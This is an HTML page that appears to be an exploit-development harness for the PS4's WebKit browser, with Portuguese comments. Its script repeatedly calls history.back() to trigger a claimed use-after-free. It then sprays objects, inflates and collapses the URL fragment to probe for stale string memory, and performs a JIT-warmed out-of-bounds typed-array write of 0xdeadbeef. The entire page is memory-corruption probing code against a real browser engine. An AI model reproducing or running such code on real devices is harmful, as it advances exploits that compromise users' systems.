<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Unified Diagnostic Harness</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { margin:5px; padding:10px; font-family: monospace; }
pre { white-space: pre-wrap; }
</style>
</head>
<body>

<h2>Unified UAF / Fragment / JIT Diagnostic Harness</h2>

<button onclick="runClassSlotTests()">[A] Testar Classes (Slot Reuse)</button>
<button onclick="runFragmentStringTests()">[B] Testar Fragment / String</button>
<button onclick="runJITIsolationTests()">[C] Testar JIT + Interseção</button>

<pre id="log"></pre>

<script>
const log = msg => {
    document.getElementById("log").textContent += msg + "\n";
};

/* -----------------------------
   UAF TRIGGER (PADRÃO CONFIRMADO)
------------------------------ */
async function triggerUAF() {
    log("=== UAF TRIGGER START ===");
    for (let i = 0; i < 48; i += 6) {
        history.back();
        await new Promise(r => setTimeout(r, 0));
        log("[ITER " + i + "] back() async");
    }
    log(">>> UAF WINDOW <<<");
}

/* -----------------------------
   DIREÇÃO A – CLASSES PEQUENAS
------------------------------ */
async function runClassSlotTests() {
    log("\n=== DIRECTION A: CLASS SLOT TESTS ===");
    await triggerUAF();

    const tests = {
        JSObject: () => ({a:1}),
        Array: () => [],
        Function: () => function(){},
        RegExp: () => /a/,
        Arguments: () => (function(){ return arguments; })(1,2,3)
    };

    for (let name in tests) {
        let objs = [];
        for (let i = 0; i < 6000; i++) objs.push(tests[name]());
        log("[CLASS] " + name + " sprayed: " + objs.length);

        try {
            let s = location.href;
            log("[CLASS " + name + "] charCodeAt(64) = " + s.charCodeAt(64));
        } catch(e) {
            log("[CLASS " + name + "] exception");
        }
    }

    log("=== END DIRECTION A ===\n");
}

/* -----------------------------
   DIREÇÃO B – FRAGMENT / STRING
------------------------------ */
async function runFragmentStringTests() {
    log("\n=== DIRECTION B: FRAGMENT / STRING TESTS ===");

    let big = "A".repeat(340000);
    location.hash = big;

    log("[BASE] URL.length = " + location.href.length);
    log("[BASE] charCodeAt(64) = " + location.href.charCodeAt(64));

    await triggerUAF();

    location.hash = "#X";

    log(">>> FRAGMENT COLLAPSE <<<");
    log("[POST] URL.length = " + location.href.length);

    [32,64,128,256].forEach(i=>{
        log("[POST] charCodeAt(" + i + ") = " + location.href.charCodeAt(i));
    });

    log("=== END DIRECTION B ===\n");
}

/* -----------------------------
   DIREÇÃO C – JIT ISOLADO
------------------------------ */
async function runJITIsolationTests() {
    log("\n=== DIRECTION C: JIT ISOLATION TEST ===");

    function jitFunc(arr, idx, val) {
        arr[idx] = val;
        return arr[idx];
    }

    let arr = new Uint32Array(16);

    // Aquecimento JIT
    for (let i = 0; i < 20000; i++) jitFunc(arr, 0, i);

    await triggerUAF();

    let r;
    try {
        r = jitFunc(arr, 16, 0xdeadbeef);
        log("[JIT] write/read idx 16 = 0x" + r.toString(16));
    } catch(e) {
        log("[JIT] exception");
    }

    log("[POST] URL.length = " + location.href.length);
    log("[POST] charCodeAt(64) = " + location.href.charCodeAt(64));

    log("=== END DIRECTION C ===\n");
}
</script>

</body>
</html>
